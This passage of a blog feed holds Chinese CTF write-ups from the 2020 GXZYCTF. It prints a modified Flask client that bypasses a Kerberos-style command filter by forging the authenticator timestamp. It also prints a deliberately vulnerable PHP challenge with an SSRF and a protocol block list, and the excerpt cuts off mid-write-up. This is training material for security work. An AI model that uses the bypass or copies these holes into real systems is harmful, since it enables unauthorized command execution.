render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'error'</span> , <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=False, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>本地起一个服务来发包就行了</p><p><img src="/2020/03/09/2020_GXZYCTF_dooog/0-1583723326867.png" alt="0-1583723326867"></p><p><img src="/2020/03/09/2020_GXZYCTF_dooog/0-1583723345340-1584691884318.png" alt>        </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目很简单，逻辑捋清楚就行了，从client出发，先后向kdc的getTGT和getTicket发包校验，校验通过则发包到cmd执行，执行没有回显，主要在getTicket中的判断限制了cmd的内容，不过认真分析一下kdc源码，可以发现data变量是可控的，控制前一数据包中的timestamp使得int(time.time()) - data[‘timestamp’] &amp;gt; 60就可以了，所以修改client app.py&lt;/p&gt;
&lt;figure class=&quot;highlight kotlin&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;from flask &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Flask, request, render_template, redirect, url_for, session, flash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;from flask_bootstrap &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Bootstrap&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;from form &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; RegisterForm, CmdForm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;from toolkit &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; AESCipher&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; os, requests, json, time, base64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;app = Flask(__name__)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;app.config[&lt;span class=&quot;string&quot;&gt;&quot;SECRET_KEY&quot;&lt;/span&gt;] = os.urandom(&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bootstrap = Bootstrap(app)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;@app&lt;/span&gt;.route(&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def index():&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; render_template(&lt;span class=&quot;string&quot;&gt;&#39;index.html&#39;&lt;/span&gt;, form=&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;@app&lt;/span&gt;.route(&lt;span class=&quot;string&quot;&gt;&#39;/cmd&#39;&lt;/span&gt;, methods=[&lt;span class=&quot;string&quot;&gt;&#39;GET&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;POST&#39;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def cmd():&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    form = CmdForm()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; request.method == &lt;span class=&quot;string&quot;&gt;&#39;GET&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; render_template(&lt;span class=&quot;string&quot;&gt;&#39;index.html&#39;&lt;/span&gt;, form=form)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    elif request.method == &lt;span class=&quot;string&quot;&gt;&#39;POST&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; form.validate_on_submit():&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            username = form.username.&lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            master_key = form.master_key.&lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            cmd = form.cmd.&lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            print(username,master_key,cmd)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            cryptor = AESCipher(master_key)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            authenticator = cryptor.encrypt(json.dumps(&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;username&#39;&lt;/span&gt;:username, &lt;span class=&quot;string&quot;&gt;&#39;timestamp&#39;&lt;/span&gt;: int(time.time())&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            res = requests.post(&lt;span class=&quot;string&quot;&gt;&#39;http://121.37.164.32:5001/getTGT&#39;&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;=&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;username&#39;&lt;/span&gt;: username, &lt;span class=&quot;string&quot;&gt;&#39;authenticator&#39;&lt;/span&gt;: base64.b64encode(authenticator)&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; res.content == &lt;span class=&quot;string&quot;&gt;&#39;time error&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flash(&lt;span class=&quot;string&quot;&gt;&#39;time error&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&quot;string&quot;&gt;&#39;index&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; res.content.startswith(&lt;span class=&quot;string&quot;&gt;&#39;auth&#39;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flash(&lt;span class=&quot;string&quot;&gt;&#39;auth error&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&quot;string&quot;&gt;&#39;index&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            session[&lt;span class=&quot;string&quot;&gt;&#39;session_key&#39;&lt;/span&gt;], session[&lt;span class=&quot;string&quot;&gt;&#39;TGT&#39;&lt;/span&gt;] = cryptor.decrypt(base64.b64decode(res.content.split(&lt;span class=&quot;string&quot;&gt;&#39;|&#39;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;])), res.content.split(&lt;span class=&quot;string&quot;&gt;&#39;|&#39;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            flash(&lt;span class=&quot;string&quot;&gt;&#39;GET TGT DONE&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            #visit TGS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            cryptor = AESCipher(session[&lt;span class=&quot;string&quot;&gt;&#39;session_key&#39;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            authenticator = cryptor.encrypt(json.dumps(&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;username&#39;&lt;/span&gt;: username, &lt;span class=&quot;string&quot;&gt;&#39;timestamp&#39;&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            res = requests.post(&lt;span class=&quot;string&quot;&gt;&#39;http://121.37.164.32:5001/getTicket&#39;&lt;/span&gt;,  &lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;=&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;username&#39;&lt;/span&gt;: username, &lt;span class=&quot;string&quot;&gt;&#39;cmd&#39;&lt;/span&gt;: cmd, &lt;span class=&quot;string&quot;&gt;&#39;authenticator&#39;&lt;/span&gt;: base64.b64encode(authenticator), &lt;span class=&quot;string&quot;&gt;&#39;TGT&#39;&lt;/span&gt;: session[&lt;span class=&quot;string&quot;&gt;&#39;TGT&#39;&lt;/span&gt;]&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; res.content == &lt;span class=&quot;string&quot;&gt;&#39;time error&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flash(&lt;span class=&quot;string&quot;&gt;&#39;time error&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&quot;string&quot;&gt;&#39;index&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; res.content.startswith(&lt;span class=&quot;string&quot;&gt;&#39;auth&#39;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flash(&lt;span class=&quot;string&quot;&gt;&#39;auth error&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&quot;string&quot;&gt;&#39;index&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; res.content == &lt;span class=&quot;string&quot;&gt;&#39;cmd error&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flash(&lt;span class=&quot;string&quot;&gt;&#39;cmd not allow&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&quot;string&quot;&gt;&#39;index&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            flash(&lt;span class=&quot;string&quot;&gt;&#39;GET Ticket DONE&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            client_message, server_message = res.content.split(&lt;span class=&quot;string&quot;&gt;&#39;|&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            session_key = cryptor.decrypt(base64.b64decode(client_message))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            cryptor = AESCipher(session_key)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            authenticator = base64.b64encode(cryptor.encrypt(username))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            res = requests.post(&lt;span class=&quot;string&quot;&gt;&#39;http://121.37.164.32:5002/cmd&#39;&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;=&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;server_message&#39;&lt;/span&gt;: server_message, &lt;span class=&quot;string&quot;&gt;&#39;authenticator&#39;&lt;/span&gt;: authenticator&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; render_template(&lt;span class=&quot;string&quot;&gt;&#39;index.html&#39;&lt;/span&gt;, form=&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, flag=res.content)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; render_template(&lt;span class=&quot;string&quot;&gt;&#39;index.html&#39;&lt;/span&gt;, form=form)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;error&#39;&lt;/span&gt; , &lt;span class=&quot;number&quot;&gt;500&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;@app&lt;/span&gt;.route(&lt;span class=&quot;string&quot;&gt;&#39;/register&#39;&lt;/span&gt;, methods=[&lt;span class=&quot;string&quot;&gt;&#39;GET&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;POST&#39;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def register():&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    form = RegisterForm()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; request.method == &lt;span class=&quot;string&quot;&gt;&#39;GET&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; render_template(&lt;span class=&quot;string&quot;&gt;&#39;index.html&#39;&lt;/span&gt;, form=form)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    elif request.method == &lt;span class=&quot;string&quot;&gt;&#39;POST&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; form.validate_on_submit():&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            username = form.username.&lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            master_key = form.master_key.&lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            res = requests.post(&lt;span class=&quot;string&quot;&gt;&#39;http://121.37.164.32:5001/register&#39;&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;=&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;username&#39;&lt;/span&gt;: username, &lt;span class=&quot;string&quot;&gt;&#39;master_key&#39;&lt;/span&gt;: master_key&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; res.content == &lt;span class=&quot;string&quot;&gt;&#39;duplicate username&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&quot;string&quot;&gt;&#39;register&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            elif res.content != &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt; :&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                session[&lt;span class=&quot;string&quot;&gt;&#39;id&#39;&lt;/span&gt;] = int(res.content)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flash(&lt;span class=&quot;string&quot;&gt;&#39;register success&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&quot;string&quot;&gt;&#39;index&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; render_template(&lt;span class=&quot;string&quot;&gt;&#39;index.html&#39;&lt;/span&gt;, form=form)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;error&#39;&lt;/span&gt; , &lt;span class=&quot;number&quot;&gt;500&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; __name__ == &lt;span class=&quot;string&quot;&gt;&#39;__main__&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    app.run(host=&lt;span class=&quot;string&quot;&gt;&#39;0.0.0.0&#39;&lt;/span&gt;, debug=False, port = &lt;span class=&quot;number&quot;&gt;5000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="Python" scheme="https://boiteam.github.io/categories/Web/Python/"/>
    
    
      <category term="Web_逻辑漏洞" scheme="https://boiteam.github.io/tags/Web-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF fmkq</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_fmkq/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_fmkq/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T11:26:26.162Z</updated>
    
    <content type="html"><![CDATA[<p>访问直接给了题目源码👇</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'head'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $begin = <span class="string">"The number you want: "</span>;</span></span><br><span class="line"><span class="php">    extract($_GET);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($head == <span class="string">''</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Where is your head?'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(preg_match(<span class="string">'/[A-Za-z0-9]/i'</span>,$head))&#123;</span></span><br><span class="line">        die('Head can\'t be like this!');</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match('/log/i',$url))&#123;</span><br><span class="line">        die('No No No');</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match('/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i',$url))&#123;</span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Don\'t use strange protocol!'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $funcname = $head.<span class="string">'curl_init'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    $ch = $funcname();</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($ch)&#123;</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_URL, $url);</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span></span><br><span class="line"><span class="php">        $output = curl_exec($ch);</span></span><br><span class="line"><span class="php">        curl_close($ch);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $output = <span class="string">'rua'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> sprintf($begin.<span class="string">'%d'</span>,$output);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>关键就是触发curl了，参考<a 